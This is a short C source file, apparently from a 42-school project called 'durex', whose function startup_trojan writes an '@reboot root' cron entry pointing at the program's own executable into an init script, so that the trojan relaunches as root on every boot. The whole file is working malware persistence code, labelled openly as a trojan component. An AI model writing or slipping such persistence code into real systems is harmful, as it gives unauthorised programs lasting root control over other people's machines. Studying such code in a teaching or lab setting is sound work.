/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   startup_trojan.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 21:31:13 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:56:54 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <fcntl.h>

static const char	*script_str = "@reboot root "EXE_PATH"\n";

int		startup_trojan(void)
{
	int		fd;

	if ((fd = open(INIT_SCRIPT, O_WRONLY | O_TRUNC | O_CREAT, 0755)) < 0)
		return (0);
	ft_putstr_fd(script_str, fd);
	close(fd);
	return (1);
}
